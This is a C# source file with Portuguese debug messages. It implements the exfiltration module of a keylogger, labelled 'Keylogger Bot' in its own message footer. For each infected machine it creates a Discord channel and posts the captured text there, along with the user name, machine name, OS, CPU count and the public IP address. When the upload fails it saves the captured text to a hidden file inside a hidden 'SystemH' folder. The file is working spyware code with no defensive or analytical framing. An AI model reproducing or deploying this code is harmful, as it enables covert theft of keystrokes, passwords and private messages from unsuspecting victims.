using DSharpPlus;
using DSharpPlus.Entities;
using System.Collections.Concurrent;
using System.Text;
using System.Text.RegularExpressions;

public class DiscordLogger : IAsyncDisposable
{
    private readonly DiscordClient _client;
    private readonly ulong _logGuildId;
    private readonly ulong _machineCategoryId;
    private readonly HttpClient _http;

    private static readonly ConcurrentDictionary<string, SemaphoreSlim> _channelLocks = new();
    private static readonly ConcurrentDictionary<string, ulong> _channelCache = new();
    private readonly SemaphoreSlim _sendSemaphore = new(1, 1);

    public DiscordLogger(string botToken, ulong logGuildId, ulong machineCategoryId, HttpClient? httpClient = null)
    {
        _logGuildId = logGuildId;
        _machineCategoryId = machineCategoryId;
        _http = httpClient ?? new HttpClient();

        _client = new DiscordClient(new DiscordConfiguration
        {
            Token = botToken,
            TokenType = TokenType.Bot,
            Intents = DiscordIntents.AllUnprivileged | DiscordIntents.MessageContents,
        });
    }

    public async Task InitializeAsync()
    {
        Console.WriteLine($"[DEBUG] Conectando ao Discord...");
        await _client.ConnectAsync().ConfigureAwait(false);

        var tcs = new TaskCompletionSource<bool>();

        _client.Ready += (s, e) =>
        {
            Console.WriteLine($"[DEBUG] Discord Ready event recebido");
            tcs.TrySetResult(true);
            return Task.CompletedTask;
        };

        Console.WriteLine($"[DEBUG] Aguardando evento Ready...");
        await Task.WhenAny(tcs.Task, Task.Delay(10000)).ConfigureAwait(false);

        if (tcs.Task.IsCompleted)
        {
            Console.WriteLine($"[DEBUG] Discord conectado com sucesso");
            Console.WriteLine($"[DEBUG] Aguardando 2 segundos para cache ser populado...");
            await Task.Delay(2000).ConfigureAwait(false);
        }
        else
        {
            Console.WriteLine($"[DEBUG] Timeout ao conectar ao Discord");
        }
    }

    private static string NormalizeChannelName(string s)
    {
        Console.WriteLine($"[DEBUG] NormalizeChannelName input: '{s}'");

        var lower = s.ToLowerInvariant();
        Console.WriteLine($"[DEBUG] ToLowerInvariant: '{lower}'");

        var sb = new StringBuilder();

        foreach (char c in lower)
        {
            if ((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))
                sb.Append(c);
            else
                sb.Append('-');
        }

        var beforeCollapse = sb.ToString();
        Console.WriteLine($"[DEBUG] Before collapse: '{beforeCollapse}'");

        var collapsed = Regex.Replace(beforeCollapse, "-+", "-").Trim('-');
        Console.WriteLine($"[DEBUG] After collapse: '{collapsed}'");

        var final = collapsed.Length > 100 ? collapsed.Substring(0, 100) : collapsed;
        Console.WriteLine($"[DEBUG] Final result: '{final}'");

        return final;
    }

    public async Task<DiscordChannel> GetOrCreateMachineChannelAsync(string machineName)
    {
        string channelName = NormalizeChannelName(machineName);

        Console.WriteLine($"[DEBUG] ==========================================");
        Console.WriteLine($"[DEBUG] GetOrCreateMachineChannelAsync iniciado");
        Console.WriteLine($"[DEBUG] machineName original: '{machineName}'");
        Console.WriteLine($"[DEBUG] channelName normalizado: '{channelName}'");
        Console.WriteLine($"[DEBUG] Cache atual tem {_channelCache.Count} entradas:");
        foreach (var kvp in _channelCache)
        {
            Console.WriteLine($"[DEBUG]   - '{kvp.Key}' -> {kvp.Value}");
        }

        if (_channelCache.TryGetValue(channelName, out var cachedId))
        {
            Console.WriteLine($"[DEBUG] Canal encontrado no cache: {channelName} -> ID: {cachedId}");
            try
            {
                var ch = await _client.GetChannelAsync(cachedId).ConfigureAwait(false);
                if (ch != null && ch.Name == channelName)
                {
                    Console.WriteLine($"[DEBUG] Canal do cache válido, retornando: {ch.Name} (ID: {ch.Id})");
                    return ch;
                }
                Console.WriteLine($"[DEBUG] Canal do cache inválido - Nome esperado: '{channelName}', Nome atual: '{ch?.Name}'");
                _channelCache.TryRemove(channelName, out _);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] Erro ao verificar canal do cache: {ex.Message}");
                _channelCache.TryRemove(channelName, out _);
            }
        }
        else
        {
            Console.WriteLine($"[DEBUG] Canal não encontrado no cache para: '{channelName}'");
        }

        var sem = _channelLocks.GetOrAdd(channelName, _ => new SemaphoreSlim(1, 1));
        Console.WriteLine($"[DEBUG] Obtendo lock para: '{channelName}'");
        await sem.WaitAsync().ConfigureAwait(false);

        try
        {
            Console.WriteLine($"[DEBUG] Lock obtido, fazendo double-check...");

            if (_channelCache.TryGetValue(channelName, out cachedId))
            {
                Console.WriteLine($"[DEBUG] Double-check: canal encontrado no cache");
                try
                {
                    var ch = await _client.GetChannelAsync(cachedId).ConfigureAwait(false);
                    if (ch != null && ch.Name == channelName)
                    {
                        Console.WriteLine($"[DEBUG] Double-check: canal válido, retornando");
                        return ch;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[DEBUG] Double-check falhou: {ex.Message}");
                }
            }

            Console.WriteLine($"[DEBUG] Obtendo guild {_logGuildId}...");
            var guild = await _client.GetGuildAsync(_logGuildId).ConfigureAwait(false);
            Console.WriteLine($"[DEBUG] Guild obtida: {guild.Name} com {guild.Channels.Count} canais");

            IEnumerable<DiscordChannel> allChannels;
            if (guild.Channels.Count == 0)
            {
                Console.WriteLine($"[DEBUG] Cache do guild vazio, fazendo busca direta dos canais...");
                try
                {
                    var channels = await guild.GetChannelsAsync().ConfigureAwait(false);
                    allChannels = channels;
                    Console.WriteLine($"[DEBUG] Busca direta retornou {channels.Count} canais");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[DEBUG] Erro na busca direta: {ex.Message}");
                    allChannels = guild.Channels.Values;
                }
            }
            else
            {
                allChannels = guild.Channels.Values;
            }

            var textChannels = allChannels.Where(c => c.Type == ChannelType.Text).ToList();
            Console.WriteLine($"[DEBUG] Canais de texto no servidor ({textChannels.Count}):");
            foreach (var ch in textChannels)
            {
                Console.WriteLine($"[DEBUG]   - '{ch.Name}' (ID: {ch.Id})");
                if (ch.Name.ToLowerInvariant() == channelName.ToLowerInvariant())
                {
                    Console.WriteLine($"[DEBUG]     ^ MATCH ENCONTRADO! ^");
                }
            }

            var existing = textChannels.FirstOrDefault(c =>
                string.Equals(c.Name, channelName, StringComparison.OrdinalIgnoreCase));

            if (existing != null)
            {
                Console.WriteLine($"[DEBUG] *** CANAL EXISTENTE ENCONTRADO ***");
                Console.WriteLine($"[DEBUG] Nome: '{existing.Name}', ID: {existing.Id}");
                Console.WriteLine($"[DEBUG] Adicionando ao cache...");
                _channelCache[channelName] = existing.Id;

                await Task.Delay(100);

                return existing;
            }

            Console.WriteLine($"[DEBUG] *** NENHUM CANAL EXISTENTE ENCONTRADO ***");
            Console.WriteLine($"[DEBUG] Criando novo canal: '{channelName}'");

            DiscordChannel? category = null;
            if (_machineCategoryId != 0)
            {
                Console.WriteLine($"[DEBUG] Procurando categoria ID: {_machineCategoryId}");
                try
                {
                    category = guild.Channels.Values.FirstOrDefault(c =>
                        c.Id == _machineCategoryId && c.Type == ChannelType.Category);

                    if (category == null)
                    {
                        Console.WriteLine($"[DEBUG] Categoria não encontrada no cache do guild, tentando buscar diretamente...");
                        var maybe = await _client.GetChannelAsync(_machineCategoryId).ConfigureAwait(false);
                        if (maybe != null && maybe.Type == ChannelType.Category)
                        {
                            category = maybe;
                            Console.WriteLine($"[DEBUG] Categoria encontrada diretamente: {category.Name}");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"[DEBUG] Categoria encontrada no cache: {category.Name}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[DEBUG] Erro ao obter categoria: {ex.Message}");
                    category = null;
                }
            }

            DiscordChannel newChannel;
            if (category == null)
            {
                Console.WriteLine($"[DEBUG] Criando canal SEM categoria...");
                newChannel = await guild.CreateTextChannelAsync(channelName, topic: $"Logs da máquina {machineName}").ConfigureAwait(false);
            }
            else
            {
                Console.WriteLine($"[DEBUG] Criando canal NA categoria: {category.Name}");
                newChannel = await guild.CreateTextChannelAsync(channelName, parent: category, topic: $"Logs da máquina {machineName}").ConfigureAwait(false);
            }

            Console.WriteLine($"[DEBUG] *** CANAL CRIADO COM SUCESSO ***");
            Console.WriteLine($"[DEBUG] Nome: '{newChannel.Name}', ID: {newChannel.Id}");
            Console.WriteLine($"[DEBUG] Adicionando ao cache...");

            _channelCache[channelName] = newChannel.Id;

            Console.WriteLine($"[DEBUG] Cache após criação:");
            foreach (var kvp in _channelCache)
            {
                Console.WriteLine($"[DEBUG]   - '{kvp.Key}' -> {kvp.Value}");
            }

            return newChannel;
        }
        finally
        {
            Console.WriteLine($"[DEBUG] Liberando lock para: '{channelName}'");
            sem.Release();
        }
    }

    public async Task SendLogAsync(string machineName, string userName, string osVersion, string cpuCount, string capturedText)
    {
        await _sendSemaphore.WaitAsync().ConfigureAwait(false);
        try
        {
            Console.WriteLine($"[DEBUG] Enviando log para máquina: {machineName}");
            var channel = await GetOrCreateMachineChannelAsync(machineName).ConfigureAwait(false);

            string publicIp;
            try
            {
                publicIp = (await _http.GetStringAsync("https://api.ipify.org").ConfigureAwait(false)).Trim();
            }
            catch
            {
                publicIp = "Não disponível";
            }

            if (capturedText.Length > 1800)
            {
                capturedText = capturedText.Substring(capturedText.Length - 1800);
                capturedText = "...[truncado]...\n" + capturedText;
            }

            var embed = new DiscordEmbedBuilder()
            .WithTitle("📝 Novo Texto Capturado")
            .WithColor(DiscordColor.Blurple)
            .WithTimestamp(DateTimeOffset.UtcNow)
            .WithFooter("Keylogger Bot")
            .AddField("👤 Usuário", userName, true)
            .AddField("🖥️ Máquina", machineName, true)
            .AddField("🛠️ OS", osVersion, true)
            .AddField("⚙ CPUs", cpuCount, true)
            .AddField("🌐 IP Público", publicIp, true)
            .AddField("📋 Texto Capturado", $"```{capturedText}```")
            .Build();

            await channel.SendMessageAsync(embed).ConfigureAwait(false);
            Console.WriteLine($"[DEBUG] Mensagem enviada com sucesso para o canal: {channel.Name}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[DEBUG] Erro ao enviar log para Discord: {ex.Message}");
            await SaveToBackupLogAsync(machineName, userName, capturedText, ex.Message).ConfigureAwait(false);
        }
        finally
        {
            _sendSemaphore.Release();
        }
    }

    private async Task SaveToBackupLogAsync(string machineName, string userName, string capturedText, string error)
    {
        try
        {
            string backupDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "SystemH", "SystemHBackup");
            Directory.CreateDirectory(backupDir);

            DirectoryInfo dirInfo = new DirectoryInfo(backupDir);
            if (!dirInfo.Attributes.HasFlag(FileAttributes.Hidden))
            {
                dirInfo.Attributes |= FileAttributes.Hidden;
            }

            string backupFile = Path.Combine(backupDir, $"SystemH_{DateTime.Now:yyyyMMdd}.log");
            string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {machineName} - {userName}\n" +
            $"Discord Error: {error}\n" +
            $"Content: {capturedText}\n" +
            "---\n\n";

            await File.AppendAllTextAsync(backupFile, logEntry, Encoding.UTF8).ConfigureAwait(false);

            FileInfo fileInfo = new FileInfo(backupFile);
            if (!fileInfo.Attributes.HasFlag(FileAttributes.Hidden))
            {
                fileInfo.Attributes |= FileAttributes.Hidden;
            }
        }
        catch
        {
            // Ignora erros de backup
        }
    }

    public async ValueTask DisposeAsync()
    {
        try
        {
            if (_client != null)
            {
                await _client.DisconnectAsync().ConfigureAwait(false);
                _client.Dispose();
            }
        }
        catch
        {
            // Ignora erros de cleanup
        }
        finally
        {
            _http?.Dispose();
        }
    }
}